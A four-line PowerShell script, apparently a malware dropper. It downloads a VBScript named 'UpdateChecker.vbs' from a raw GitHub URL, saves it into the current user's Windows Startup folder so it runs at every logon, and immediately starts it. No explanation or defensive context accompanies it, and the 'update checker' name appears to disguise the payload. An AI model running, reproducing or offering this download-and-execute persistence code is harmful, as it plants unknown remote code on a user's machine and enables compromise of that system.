$url = "https://raw.githubusercontent.com/AmjadBalls/Ramizjaber12/refs/heads/main/UpdateChecker.vbs"
$dest = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecker.vbs"
Invoke-WebRequest -Uri $url -OutFile $dest
Start-Process $dest
